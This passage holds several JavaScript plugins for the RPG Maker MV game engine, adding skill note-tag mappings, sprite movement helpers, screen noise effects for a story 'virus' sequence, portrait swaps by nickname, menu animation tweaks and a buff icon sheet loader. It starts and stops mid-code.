[/(^|\n)afterimage:[ ]+(on|off)[ ]*([^ \n][^\n]*)?(?=($|\n))/gi,function(){
	return arguments[1]+"eval: BattleManager.setAfterimageO"+arguments[2].slice(1)+"(self"+(arguments[3]?','+arguments[3]:"")+");";
}],

[/(^|\n)change[ \t]*to[ \t]*skill:[ \t]*([1-9][0-9]*|0x[0-9A-Fa-f]+|0)[ \t]*(?=($|\n))/gi,function(){
	return arguments[1]+"eval: BattleManager._action._item.setObject($dataSkills[" + Number(arguments[2]) + "]);";
}],

[/(^|\n)change[ \t]*to[ \t]*item:[ \t]*([1-9][0-9]*|0x[0-9A-Fa-f]+|0)[ \t]*(?=($|\n))/gi,function(){
	return arguments[1]+"eval: BattleManager._action._item.setObject($dataItems[" + Number(arguments[2]) + "]);";
}],

[/(^|\n)change[ \t]+background:[ \t]*(change|clear|restore)([ ]+|[]*,[]*)($|(?!([ ])))([^\n]*)(?=($|\n))/gi,function(){
	return arguments[1]+"eval: SceneManager._scene._spriteset.dynamicBattleback_"+arguments[2]+"("+arguments[6]+");";
}],

];



new cfc(DataManager).add('onLoad_before_skill',function f(obj){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	obj.forEach(f.tbl[0]);
	return rtv;
},[
skill=>{ if(!skill) return;
	for(let x=0;x!==mappings.length;++x) skill.note=skill.note.split(mappings[x][0]).join(mappings[x][1]);
	for(let x=0;x!==mappings_regExp.length;++x){
		try{
			skill.note=skill.note.replace(mappings_regExp[x][0],mappings_regExp[x][1]);
		}catch(e){
			switch(e.message){
			default:
				throw new Error('unknown error at skill '+skill.id+' in note');
			case 'p':
				throw new Error('self defined yep mapping params error at skill '+skill.id+' in note');
			}
		}
	}
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc Sprite_Battler.prototype.startMoveDelta
 * @author agold404
 * @help startMoveDelta
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Sprite_Battler.prototype;
p.finalPos=function(){
	const b=this;
	return b._movementDuration?[b._targetOffsetX,b._targetOffsetY]:[b._offsetX,b._offsetY];
};
p.finalPosAbs=function(){
	const b=this;
	const rtv=b.finalPos();
	rtv[0]+=b._homeX;
	rtv[1]+=b._homeY;
	return rtv;
};
p.startMoveTo=function(b,d){
	const src=this.finalPosAbs(),dst=b.finalPosAbs();
	return this.startMoveDelta(dst[0]-src[0],dst[1]-src[1],d);
};
p.startMoveDelta=function(x,y,d){
	const curr=this.finalPos();
	return this.startMove(curr[0]+x,curr[1]+y,d);
};
}

})();


﻿"use strict";
/*:
 * @plugindesc .getData is useful
 * @author agold404
 * @help .getData
 * 
 * This plugin can be renamed as you want.
 */
(()=>{ let k,r,t;

t='prototype';
k='getData';
Game_Battler[t][k]=()=>{};
Game_Actor[t][k]=function(){ return this.actor(); };
Game_Enemy[t][k]=function(){ return this.enemy(); };

k='getMeta';
Game_Battler[t][k]=()=>{};
Game_Enemy[t][k]=Game_Actor[t][k]=function(){ return this.getData().meta; };

})();


﻿"use strict";
/*:
 * @plugindesc 雜訊效果
 * @author agold404
 * @help ref: https://youtu.be/IE6pK1i1DeA?t=447
 * 時間07:30~07:55處
 * 這邊的畫面特效會用在天使蛋糕中了病毒使用
 * 大致上會有幾個損毀階段：
 * 1. 畫面四周有雜訊
 * 2.更加擴大的雜訊
 * 3.雜訊+部分區域黑屏
 * 
 * // by id
 * 1: horizontal noise
 * 2: vertical noise
 * 3: spots
 * 
 * // data structure is bitmask
 * 0,1: none
 * 2: horizontal noise
 * 4: vertical noise  
 * 8: spots
 * 
 * 
 * $gameScreen.clearNoiseEffect(noise_type);
 * $gameScreen.setNoiseEffect(noise_type,[冷卻時間_單位幀,持續時間_單位幀,橫向長度_畫面比例,冷卻後產生的機率_每幀隨機一次,負片機率預設=0]);
 * 
 * 
 * This plugin can be renamed as you want.
 */
(()=>{ let k,r,t;

{ const p=Game_Screen.prototype;
k='clear';
r=p[k]; (p[k]=function f(){
	this.clearNoiseEffectAll();
	return f.ori.apply(this,arguments);
}).ori=r;
p.genIfNotExist_noiseArgvv=function(){
	if(!this._noiseArgvv) this._noiseArgvv=[];
};
p.clearNoiseEffectAll=function(){
	if(this._noiseArgvv) this._noiseArgvv.length=1; else this._noiseArgvv=[0];
	this._noiseEffect=0;
};
p.noiseEffect=function(){
	return this._noiseEffect;
};
p.noiseEffectArgv=function(id){
	this.genIfNotExist_noiseArgvv();
	return this._noiseArgvv[id];
};
p.setNoiseEffect=function(id,argv){
	this.genIfNotExist_noiseArgvv();
	this._noiseArgvv[id]=argv;
	return this._noiseEffect|=(1<<id);
};
p.clearNoiseEffect=function(id){
	this.setNoiseEffect(id,0);
	while(this._noiseArgvv.length && !this._noiseArgvv[this._noiseArgvv.length-1]) this._noiseArgvv.pop();
	return this._noiseEffect^=(1<<id);
};
}

{ const p=Graphics;
k='render';
r=p[k]; (p[k] = function f(stage){
	if(this._rendered = --this._skipCount < 0) {
		const startTime = Date.now();
		if(stage){
			this._renderer.render(stage);
			if(this._renderer.gl && this._renderer.gl.flush) this._renderer.gl.flush();
		}
		if(this._effectFuncs) this._effectFuncs.forEach(f.forEach,this);
		if(this._effectFuncsOnce){
			this._effectFuncsOnce.forEach(f.forEach,this);
			this._effectFuncsOnce.length=0;
		}
		if($gameScreen){
			this.renderNoiseEffect_h();
			this.renderNoiseEffect_v();
			this.renderNoiseEffect_s();
		}
		this.renderOtherEffects(stage);
		this._skipCount = Math.min((Date.now() - startTime)>>4, this._maxSkip);
	}
	this.frameCount+=SceneManager._updateSceneCnt|0; SceneManager._updateSceneCnt=0|0;
}).ori=r;
p[k].forEach=function(f){ f.call(this); };
if(!p.renderOtherEffects) p.renderOtherEffects=()=>{};
if(!p.renderEffects_sortCanvas) p.renderEffects_sortCanvas=()=>{};

t=p.renderNoiseEffect_h=function f(){
	// light weight: 1/4 width , 1/4 height. and that's the limit
	const canvasId='NoiseEffect_h',d=document;
	const c=this._canvas;//,ctx=c.getContext('2d');
	const nh=c.height>>5||1;
	const w=c.width>>2,h=c.height>>2;
	
	if(!this.refGameSystem_isCurrent()){
		this.refGameSystem_set();
		f.tbl[0]=$gameSystem._framesOnSave||0;
	}
	if(Graphics.frameCount<f.tbl[0]) f.tbl[0]=Graphics.frameCount; // new game or load game
	
	let gc2=f.gc2||d.getElementById(canvasId);
	if(!gc2){
		gc2=f.gc2=d.createElement('canvas');
		gc2.setAttribute('id',canvasId);
		gc2.setAttribute('style',c.getAttribute('style'));
		d.body.appendChild(gc2);
		gc2.width=w;
		gc2.height=h;
		this.renderEffects_sortCanvas();
	}
	if(!($gameScreen.noiseEffect()&2)){
		let ret=1;
		for(let x=1,arr=f.tbl;x!==arr.length;++x){
			if(arr[x][0]){
				ret=0;
				break;
			}
		}
		if(ret){
			f.tbl.length=1;
			f.tbl[0]=0;
			return gc2.style.display="none";
		}
	}
	const argv=$gameScreen.noiseEffectArgv(1); // [ CD , 持續 , 長度(遊戲畫面比例) , 每幀機率 , 負片機率]
	if(gc2.style.width!==c.style.width) gc2.style.width=c.style.width;
	if(gc2.style.height!==c.style.height) gc2.style.height=c.style.height;
	
	const ctx2=gc2.getContext('2d'); ctx2.clearRect(0,0,w,h);
	f.tbl2[0]=f.tbl[0];
	if(f.tmpc.height!==nh) f.tmpc.height=nh>>2||1;
	for(let i=1,arr=f.tbl,tmpc=f.tmpc,prm,lenO,lenM,tmpctx,grd;i!==arr.length;++i){
		prm=arr[i];
		const ctr=(prm[1]<<1)-(Graphics.frameCount-prm[0]);
		if(ctr>prm[1]){
			lenM=prm[2]*w*((prm[1]<<1)-ctr)/prm[1];
			lenO=prm[2]*c.width*((prm[1]<<1)-ctr)/prm[1];
		}else{
			lenM=prm[2]*w*ctr/prm[1];
			lenO=prm[2]*c.width*ctr/prm[1];
		}
		if(lenM>0){
		//
		tmpc.width=lenM;
		tmpctx=tmpc.getContext('2d');
		tmpctx.globalCompositeOperation='source-over';
		{
			if(prm[3][0]){
				grd=tmpctx.createRadialGradient(0,tmpc.height>>1,0, 0,tmpc.height>>1,lenM);
			}else{
				grd=tmpctx.createRadialGradient(lenM-1,tmpc.height>>1,0, lenM-1,tmpc.height>>1,lenM);
			}
			grd.addColorStop(0, 'black');
			grd.addColorStop(1, "rgba(0,0,0,0)");
			tmpctx.fillStyle = grd;
			tmpctx.fillRect(0,0,tmpc.width,tmpc.height);
		}
		tmpctx.globalCompositeOperation='source-in';
		{
			lenO>>=3;
			lenO+=nh>>1;
			let tmpc2,tmpctx2;
			if(prm[4]){
				tmpc2=f.tmpc2||(f.tmpc2=document.createElement('canvas'));
				const c=tmpctx.canvas;
				tmpc2.width  =c.width  ;
				tmpc2.height =c.height ;
				tmpctx2=tmpc2.getContext('2d');
				tmpctx2.fillStyle='rgba(255,255,255,1)';
				tmpctx2.fillRect(0,0,tmpc.width,tmpc.height);
				tmpctx2.globalCompositeOperation='difference';
			}
			if(prm[3][0]){
				if(prm[4]){
					tmpctx2.drawImage(c,0,prm[3][1],lenO,nh,0,0,tmpc.width,tmpc.height);
					tmpctx.drawImage(tmpc2,0,0);
				}else tmpctx.drawImage(c,0,prm[3][1],lenO,nh,0,0,tmpc.width,tmpc.height);
				ctx2.drawImage(tmpc,0,prm[3][1]>>2);
			}else{
				if(prm[4]){
					tmpctx2.drawImage(c,c.width-lenO,prm[3][1],lenO,nh,0,0,tmpc.width,tmpc.height);
					tmpctx.drawImage(tmpc2,0,0);
				}else tmpctx.drawImage(c,c.width-lenO,prm[3][1],lenO,nh,0,0,tmpc.width,tmpc.height);
				ctx2.drawImage(tmpc,w-lenM,prm[3][1]>>2);
			}
		}
		//
		}
		if(ctr>0) f.tbl2.push(arr[i]);
	}
	{ const tmp=f.tbl; f.tbl=f.tbl2; f.tbl2=tmp; tmp.length=1; }
	if(argv && Graphics.frameCount-f.tbl[0]>=argv[0] && Math.random()<argv[3]){
		f.tbl[0]=Graphics.frameCount;
		f.tbl.push([Graphics.frameCount,argv[1],argv[2],[Math.random()<0.5,(c.height+nh)*Math.random()-nh,],Math.random()<argv[4],]);
		// frm_strt,ctr_max,len_ratio,[LR,y]
	}
	if(gc2.style.display==="none") gc2.style.display="";
};
t.tbl=[0]; // 上一次進函式且有新增時的frameCount
t.tbl2=[];
t.tmpc=document.createElement('canvas');
t.gc2=undefined;

t=p.renderNoiseEffect_v=function f(){
	// light weight: 1/4 width , 1/4 height. and that's the limit
	const canvasId='NoiseEffect_v',d=document;
	const c=this._canvas;//,ctx=c.getContext('2d');
	const nw=c.width>>5||1;
	const w=c.width>>2,h=c.height>>2;
	
	if(!this.refGameSystem_isCurrent()){
		this.refGameSystem_set();
		f.tbl[0]=$gameSystem._framesOnSave||0;
	}
	if(Graphics.frameCount<f.tbl[0]) f.tbl[0]=Graphics.frameCount; // new game or load game
	
	let gc2=f.gc2||d.getElementById(canvasId);
	if(!gc2){
		gc2=f.gc2=d.createElement('canvas');
		gc2.setAttribute('id',canvasId);
		gc2.setAttribute('style',c.getAttribute('style'));
		d.body.appendChild(gc2);
		gc2.width=w;
		gc2.height=h;
		this.renderEffects_sortCanvas();
	}
	if(!($gameScreen.noiseEffect()&4)){
		let ret=1;
		for(let x=1,arr=f.tbl;x!==arr.length;++x){
			if(arr[x][0]){
				ret=0;
				break;
			}
		}
		if(ret){
			f.tbl.length=1;
			f.tbl[0]=0;
			return gc2.style.display="none";
		}
	}
	const argv=$gameScreen.noiseEffectArgv(2); // [ CD , 持續 , 長度(遊戲畫面比例) , 每幀機率 , 負片機率]
	if(gc2.style.width!==c.style.width) gc2.style.width=c.style.width;
	if(gc2.style.height!==c.style.height) gc2.style.height=c.style.height;
	
	const ctx2=gc2.getContext('2d'); ctx2.clearRect(0,0,w,h);
	f.tbl2[0]=f.tbl[0];
	if(f.tmpc.width!==nw) f.tmpc.width=nw>>2||1;
	for(let i=1,arr=f.tbl,tmpc=f.tmpc,prm,lenO,lenM,tmpctx,grd;i!==arr.length;++i){
		prm=arr[i];
		const ctr=(prm[1]<<1)-(Graphics.frameCount-prm[0]);
		if(ctr>prm[1]){
			lenM=prm[2]*h*((prm[1]<<1)-ctr)/prm[1];
			lenO=prm[2]*c.height*((prm[1]<<1)-ctr)/prm[1];
		}else{
			lenM=prm[2]*h*ctr/prm[1];
			lenO=prm[2]*c.height*ctr/prm[1];
		}
		if(lenM>0){
		//
		tmpc.height=lenM;
		tmpctx=tmpc.getContext('2d');
		tmpctx.globalCompositeOperation='source-over';
		{
			if(prm[3][1]){
				grd=tmpctx.createRadialGradient(tmpc.width>>1,0,0, tmpc.width>>1,0,lenM);
			}else{
				grd=tmpctx.createRadialGradient(tmpc.width>>1,lenM-1,0, tmpc.width>>1,lenM-1,lenM);
			}
			grd.addColorStop(0, 'black');
			grd.addColorStop(1, "rgba(0,0,0,0)");
			tmpctx.fillStyle = grd;
			tmpctx.fillRect(0,0,tmpc.width,tmpc.height);
		}
		tmpctx.globalCompositeOperation='source-in';
		{
			lenO>>=3;
			lenO+=nw>>1;
			let tmpc2,tmpctx2;
			if(prm[4]){
				tmpc2=f.tmpc2||(f.tmpc2=document.createElement('canvas'));
				const c=tmpctx.canvas;
				tmpc2.width  =c.width  ;
				tmpc2.height =c.height ;
				tmpctx2=tmpc2.getContext('2d');
				tmpctx2.fillStyle='rgba(255,255,255,1)';
				tmpctx2.fillRect(0,0,tmpc.width,tmpc.height);
				tmpctx2.globalCompositeOperation='difference';
			}
			if(prm[3][1]){
				if(prm[4]){
					tmpctx2.drawImage(c, prm[3][0],0,nw,lenO, 0,0,tmpc.width,tmpc.height);
					tmpctx.drawImage(tmpc2,0,0);
				}else tmpctx.drawImage(c, prm[3][0],0,nw,lenO, 0,0,tmpc.width,tmpc.height);
				ctx2.drawImage(tmpc,prm[3][0]>>2,0);
			}else{
				if(prm[4]){
					tmpctx2.drawImage(c, prm[3][0],c.height-lenO,nw,lenO, 0,0,tmpc.width,tmpc.height);
					tmpctx.drawImage(tmpc2,0,0);
				}else tmpctx.drawImage(c, prm[3][0],c.height-lenO,nw,lenO, 0,0,tmpc.width,tmpc.height);
				ctx2.drawImage(tmpc,prm[3][0]>>2,h-lenM);
			}
		}
		//
		}
		if(ctr>0) f.tbl2.push(arr[i]);
	}
	{ const tmp=f.tbl; f.tbl=f.tbl2; f.tbl2=tmp; tmp.length=1; }
	if(argv && Graphics.frameCount-f.tbl[0]>=argv[0] && Math.random()<argv[3]){
		f.tbl[0]=Graphics.frameCount;
		f.tbl.push([Graphics.frameCount,argv[1],argv[2],[(c.width+nw)*Math.random()-nw,Math.random()<0.5,],Math.random()<argv[4],]);
		// frm_strt,ctr_max,len_ratio,[x,UD]
	}
	if(gc2.style.display==="none") gc2.style.display="";
};
t.tbl=[0];
t.tbl2=[];
t.tmpc=document.createElement('canvas');
t.gc2=undefined;

t=p.renderNoiseEffect_s=function f(){
	// light weight: 1/4 width , 1/4 height. and that's the limit
	const canvasId='NoiseEffect_s',d=document;
	const c=this._canvas;//,ctx=c.getContext('2d');
	const nw=c.width>>5||1;
	const w=c.width>>2,h=c.height>>2;
	const mwh=Math.min(w,h);
	
	if(!this.refGameSystem_isCurrent()){
		this.refGameSystem_set();
		f.tbl[0]=$gameSystem._framesOnSave||0;
	}
	if(Graphics.frameCount<f.tbl[0]) f.tbl[0]=Graphics.frameCount; // new game or load game
	
	let gc2=f.gc2||d.getElementById(canvasId);
	if(!gc2){
		gc2=f.gc2=d.createElement('canvas');
		gc2.setAttribute('id',canvasId);
		gc2.setAttribute('style',c.getAttribute('style'));
		d.body.appendChild(gc2);
		gc2.width=w;
		gc2.height=h;
		this.renderEffects_sortCanvas();
	}
	if(!($gameScreen.noiseEffect()&8)){
		let ret=1;
		for(let x=1,arr=f.tbl;x!==arr.length;++x){
			if(arr[x][0]){
				ret=0;
				break;
			}
		}
		if(ret){
			f.tbl.length=1;
			f.tbl[0]=0;
			return gc2.style.display="none";
		}
	}
	const argv=$gameScreen.noiseEffectArgv(3); // [ CD , 持續_[] , 半徑(遊戲畫面比例,取較小長寬)_[] , 每幀機率 , alpha_[] , ]
	if(gc2.style.width!==c.style.width) gc2.style.width=c.style.width;
	if(gc2.style.height!==c.style.height) gc2.style.height=c.style.height;
	
	const ctx2=gc2.getContext('2d'); ctx2.clearRect(0,0,w,h);
	f.tbl2[0]=f.tbl[0];
	for(let i=1,arr=f.tbl,tmpc=f.tmpc,prm,r,a,tmpctx,grd;i!==arr.length;++i){
		prm=arr[i];
		/*
			1/4 appear
			1/4 stay
			1/2 disappear
		*/
		const ctr=(prm[1]<<1)-(Graphics.frameCount-prm[0]);
		if(ctr>prm[1]){
			a=(ctr-prm[1])<<1;
			if(a>prm[1]){
				// appear
				// ((prm[1]<<1)-ctr)/(prm[1]>>1);
				r=a=(ctr-a)/(prm[1]>>1);
			}else{
				// stay
				r=a=1;
			}
		}else{
			// disappear
			r=1;
			a=ctr/prm[1];
		}
		r*=prm[2]*mwh;
		a*=prm[4];
		if(r>0 && a>0){
		//
		tmpc.height=tmpc.width=prm[2]*(mwh<<1)+2;
		tmpctx=tmpc.getContext('2d');
		// tmpctx.globalCompositeOperation='source-over';
		{
			grd=tmpctx.createRadialGradient(tmpc.width>>1,tmpc.height>>1,r, tmpc.width>>1,tmpc.height>>1,tmpc.height>>1);
			grd.addColorStop(0, "rgba(0,0,0,"+a+")");
			grd.addColorStop(1, "rgba(0,0,0,0)");
			tmpctx.fillStyle = grd;
			tmpctx.fillRect(0,0,tmpc.width,tmpc.height);
		}
		// tmpctx.globalCompositeOperation='source-in';
		{
			ctx2.drawImage(tmpc,(prm[3][0]>>2)-(tmpc.width>>1),(prm[3][1]>>2)-(tmpc.height>>1));
		}
		//
		}
		if(ctr>0) f.tbl2.push(arr[i]);
	}
	{ const tmp=f.tbl; f.tbl=f.tbl2; f.tbl2=tmp; tmp.length=1; }
	if(argv && Graphics.frameCount-f.tbl[0]>=argv[0] && Math.random()<argv[3]){
		f.tbl[0]=Graphics.frameCount;
		const r=(argv[2][1]-argv[2][0])*Math.random()+argv[2][0];
		f.tbl.push([Graphics.frameCount,
			(argv[1][1]-argv[1][0])*Math.random()+argv[1][0],
			r,
			[((r*2)+c.width)*Math.random()-r,((r*2)+c.height)*Math.random()-r,],
			(argv[4][1]-argv[4][0])*Math.random()+argv[4][0],
		]);
		// frm_strt,ctr_max,radius_ratio,[x,y],alpha
	}
	if(gc2.style.display==="none") gc2.style.display="";
};
t.tbl=[0];
t.tbl2=[];
t.tmpc=document.createElement('canvas');
t.gc2=undefined;
}

})();


﻿"use strict";
/*:
 * @plugindesc 依暱稱更換立繪，依裝備(armor,etypeId=4)更換暱稱
 * @author agold404
 * @help need MOG_BattleResult.js , MOG_SceneMenu.js
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw='立繪if暱稱',kw2='裝備更換暱稱',etypeId=4;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors.forEach(f.tbl[0]);
	$dataArmors.forEach(f.tbl[1]);
	$dataWeapons.forEach(f.tbl[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
actr=>{ if(!actr) return;
	const meta=actr.meta;
	if(meta[kw]&&meta[kw].constructor===String){
		const o=meta[kw];
		meta[kw]=JSON.parse(o);
		if(meta[kw]&&meta[kw].constructor===String){
			meta[kw]=o;
		}
	}
},
equip=>{ if(!equip) return;
	equip[kw2]=equip.etypeId===etypeId&&equip.meta[kw2];
},
];
}

if(typeof BattleResult!=='undefined'){ const p=BattleResult.prototype;
k='createActorSprite';
r=p[k]; (p[k]=function f(){
	if(!this._actor || !this._actor._nickname || !this._actor.actor().meta[kw] || !this._actor.actor().meta[kw][this._actor._nickname]) return f.ori.apply(this,arguments);
	const a=ImageManager,r=a.loadPicture;
	(a.loadPicture=f.tbl).tbl = this._actor.actor().meta[kw][this._actor._nickname];
	const rtv=f.ori.apply(this,arguments);
	a.loadPicture=r;
	return rtv;
}).ori=r;
(p[k].tbl=function f(){
	return f.ori.call(ImageManager,f.tbl);
}).ori=ImageManager.loadPicture;
}else console.warn("maybe no MOG_BattleResult.js");

if(typeof MBustMenu!=='undefined'){ const p=MBustMenu.prototype;
k='createCharaters';
r=p[k]; (p[k]=function f(){
	if(!this._actor || !this._actor._nickname || !this._actor.actor().meta[kw] || !this._actor.actor().meta[kw][this._actor._nickname]) return f.ori.apply(this,arguments);
	const a=ImageManager,r=a.loadMenusFaces3;
	(a.loadMenusFaces3=f.tbl).tbl = this._actor.actor().meta[kw][this._actor._nickname];
	const rtv=f.ori.apply(this,arguments);
	a.loadMenusFaces3=r;
	return rtv;
}).ori=r;
(p[k].tbl=function f(){
	return f.ori.call(ImageManager,f.tbl);
}).ori=ImageManager.loadMenusFaces3;
}else console.warn("maybe no MOG_SceneMenu.js");

if(typeof Scene_Status!=='undefined'){ const p=Scene_Status.prototype;
k='refreshBust';
r=p[k]; (p[k]=function f(){
	if(!this._actor || !this._actor._nickname || !this._actor.actor().meta[kw] || !this._actor.actor().meta[kw][this._actor._nickname]) return f.ori.apply(this,arguments);
	const a=ImageManager,r=a.loadMenusFaces4;
	(a.loadMenusFaces4=f.tbl).tbl = this._actor.actor().meta[kw][this._actor._nickname];
	const rtv=f.ori.apply(this,arguments);
	a.loadMenusFaces4=r;
	return rtv;
}).ori=r;
(p[k].tbl=function f(){
	return f.ori.call(ImageManager,f.tbl);
}).ori=ImageManager.loadMenusFaces4;
}else console.warn("maybe no MOG_SceneStatus.js");

if(0){ const p=Game_Actor.prototype;
k='initEquips';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._equipsCache_clear();
	return rtv;
}).ori=r;
k='releaseUnequippableItems';
r=p[k]; (p[k]=function f(){
	this._equipsCache_dontUse=1;
	const rtv=f.ori.apply(this,arguments);
	this._equipsCache_dontUse=0;
	return rtv;
}).ori=r;
k='_equipsCache_get';
r=p[k]; (p[k]=function f(){
	if($gameTemp){
		if(!$gameTemp.cache_equips) $gameTemp.cache_equips=new Map();
		return $gameTemp.cache_equips;
	}
}).ori=r;
k='_equipsCache_clear';
r=p[k]; (p[k]=function f(){
	if($gameTemp){
		if(!$gameTemp.cache_equips) $gameTemp.cache_equips=new Map();
		$gameTemp.cache_equips.delete(this);
	}
}).ori=r;
k='refresh';
r=p[k]; (p[k]=function f(){
	if(this._clearCache_equip) this._equipsCache_clear();
	const rtv=f.ori.apply(this,arguments);
	return rtv;
}).ori=r;
k='equips';
r=p[k]; (p[k]=function f(){
	const cache=this._equipsCache_get();
	if(!cache || this._equipsCache_dontUse) return f.ori.apply(this,arguments);
	let rtv=cache.get(this);
	if(!rtv) cache.set(this,rtv=f.ori.apply(this,arguments));
	return rtv;
}).ori=r;
k='_changeEquip_onChangeSuccess';
r=p[k]; (p[k]=function f(slotId,oriItem,item){
	if(item && item[kw2]) this._nickname=item[kw2];
	else if(oriItem && oriItem[kw2]) this._nickname=this.getData().nickname;
	this._equips[slotId].setObject(item);
	this._clearCache_equip=1;
	this.refresh();
	this._clearCache_equip=0;
}).ori=r;
k='changeEquip';
r=p[k]; (p[k]=function f(slotId,item){
	const oriItem=this.equips()[slotId];
	if (this.tradeItemWithParty(item, oriItem) && (!item || this.equipSlots()[slotId] === item.etypeId)) {
		this._changeEquip_onChangeSuccess(slotId,oriItem,item);
	}
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc MOG_BattleResult now can fasten by only pressed
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if(typeof BattleResult==='function'){ const p=BattleResult.prototype;
p.isUpdateLevel=function(){ return this._phase===4; };
k='pressAnyKey';
r=p[k]; (p[k]=function f(){
	return !this.isUpdateLevel() && (TouchInput.isPressed()||Input.isPressed('ok')) || (TouchInput.isLongPressed(0,264)||Input.isLongPressed('ok',264)) || f.ori.apply(this,arguments);
}).ori=r;
k='updateVictAnimation';
k='update';
r=p[k]; (p[k]=function f(){
	if(!this.isUpdateLevel() && this.pressAnyKey()) f.ori.apply(this,arguments);
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 修改 MOG_SceneMenu.js 。上下上下到底誰想ㄉ啦
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Moghunter!=='undefined' && Moghunter.scMenu_ComY!==undefined)(()=>{ let k,r,t;

{ const p=Scene_Menu.prototype;
k='createCommands';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	for(let i=0;i!==this._comList.length;++i){
		const sp=this._commands[i];
		const bm=sp.bitmap;
		if(bm) bm.addLoadListener(bm=>sp.y=-bm.height);
		this._compos[i][1]=Moghunter.scMenu_ComY;
	}
	return rtv;
}).ori=r;
k='updateCommands';
r=p[k];(p[k]=function f(){ // 好像應該直接蓋掉
	// this.updateComField();
	for(let i=0,nx=0,ny=0;i<this._commands.length;++i){
		if(this.isComEnabled(i)){
			nx = this._compos[i][0] ;
			ny = this._compos[i][1] ;
			if(this._commandWindow.isCurrentItemEnabled()) this._commands[i].opacity += f.tbl.opacity.step2;
			if(this._comzoom[i] === 0 && !this._statusWindow.active){
				this._commands[i].scale.x += f.tbl.scale.step;
				if(this._commands[i].scale.x >= f.tbl.scale.max){
					this._commands[i].scale.x = f.tbl.scale.max;
					this._comzoom[i] = 1;
				}
			}else{
				this._commands[i].scale.x -= f.tbl.scale.step;
				if(this._commands[i].scale.x <= f.tbl.scale.min) {
					this._commands[i].scale.x = f.tbl.scale.min;
					this._comzoom[i] = 0;
				}
			}
		}else{ 
			nx = this._compos[i][0];
			ny = this._compos[i][1];
			if(this._statusWindow.active){
				this._commands[i].opacity -= f.tbl.opacity.step;
				if(this._commands[i].opacity < f.tbl.opacity.min) this._commands[i].opacity = f.tbl.opacity.min;
				nx+=f.tbl.shiftOthers.dx;
				ny+=f.tbl.shiftOthers.dy;
			}else if(this._commands[i].opacity !== f.tbl.opacity.goal){
				if(this._commands[i].opacity < f.tbl.opacity.sep){
					this._commands[i].opacity += f.tbl.opacity.step;
					if(this._commands[i].opacity > f.tbl.opacity.sep) this._commands[i].opacity = f.tbl.opacity.sep;
				}else{
					this._commands[i].opacity -= f.tbl.opacity.step;
					if(this._commands[i].opacity < f.tbl.opacity.sep) this._commands[i].opacity = f.tbl.opacity.sep;
				}
			}
			if(this._commands[i].scale.x > 1) this._commands[i].scale.x -= f.tbl.scale.step;
			this._comzoom[i] = 0;
		}
		this._commands[i].x = this.commandMoveTo(this._commands[i].x,nx);
		this._commands[i].y = this.commandMoveTo(this._commands[i].y,ny);
		this._commands[i].scale.y = this._commands[i].scale.x;
	}
}).ori=r;
p[k].tbl={
	shiftOthers:{
		dx:16,
		dy:-64,
	},
	opacity:{
		goal:180,
		min:60,
		sep:180,
		step:10,
		step2:20,
	},
	scale:{
		max:1.3125,
		min:1,
		step:0.0078125,
	},
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 量距離每次都要寫一堆，很煩ㄟ
 * @author agold404
 * @help 詳細說明
 * 第二行
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Character.prototype;
p.dist1=function(c){
	const dx=this.x-c.x,dy=this.y-c.y;
	return Math.abs(dx)+Math.abs(dy);
};
p.dist1_r=function(c){
	const dx=this._realX-c._realX,dy=this._realY-c._realY;
	return Math.abs(dx)+Math.abs(dy);
};
p.dist2=function(c){
	const dx=this.x-c.x,dy=this.y-c.y;
	return dx*dx+dy*dy;
};
p.dist2_r=function(c){
	const dx=this._realX-c._realX,dy=this._realY-c._realY;
	return dx*dx+dy*dy;
};
}

})();


﻿"use strict";
/*:
 * @plugindesc buff有獨立ㄉ圖組ㄌ
 * @author agold404
 * @help 詳細說明
 * 第二行
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const buffIconImgName='IconBuff';
const buffIconIdxPad='_buffIconIndexPad';

{ const a=Game_BattlerBase,p=a.prototype;
if(!a[buffIconIdxPad]) a[buffIconIdxPad]=0;
k='buffIconIndex';
r=p[k]; (p[k]=function f(lv,paramId){
	lv|=0; if(!lv) return 0;
	const shift=(lv<0)<<3;
	if(lv<0) lv=-lv;
	return Game_BattlerBase[buffIconIdxPad]+( shift|((lv.clamp(f.tbl.min,f.tbl.max)-1)<<4) )+paramId;
}).ori=r;
p[k].tbl={
	min:1,
	max:2,
};
}

{ const p=Bitmap.prototype;
k='isReady';
r=p[k]; (p[k]=function f(){
	return (!this._series||!this._series.size)&&f.ori.apply(this,arguments);
}).ori=r;
p.addSeries=function(key,bm){
	if(!this._series) this._series=new Map();
	if(this._series.has(key)) return;
	this._series.set(key,bm);
	bm.addLoadListener(()=>this._series.delete(key));
};
}

cf(Scene_Boot,'loadSystemImages',function f(){
	f.tbl[0]();
	return f.ori.apply(this,arguments);
},[
()=>{
	const rsrvId='-'+Math.random();
	const base=ImageManager.reserveSystem('IconSet');
	ImageManager.loadWithoutError_set(true);
	const buff=ImageManager.reserveSystem(buffIconImgName,undefined,rsrvId);
	ImageManager.loadWithoutError_set(false);
	base.addSeries(buffIconImgName,buff);
	const f=()=>{
		base._image_ori=base._image_ori||base._image;
		const img=base._image;
		const c=base._image=document.createElement('canvas');
		c.width=img.width;
		c.height=img.height+buff.height;
		c.getContext('2d').drawImage(img,0,0);
		c.getContext('2d').drawImage(buff._image_ori||buff._image,0,img.height);
		Game_BattlerBase[buffIconIdxPad]=(~~(img.height/Sprite_StateIcon._iconHeight))<<4;
		Game_BattlerBase.prototype.buffIconIndex.tbl.max=~~(buff.height/Sprite_StateIcon._iconHeight+0.5);
		ImageManager.releaseReservation(rsrvId);
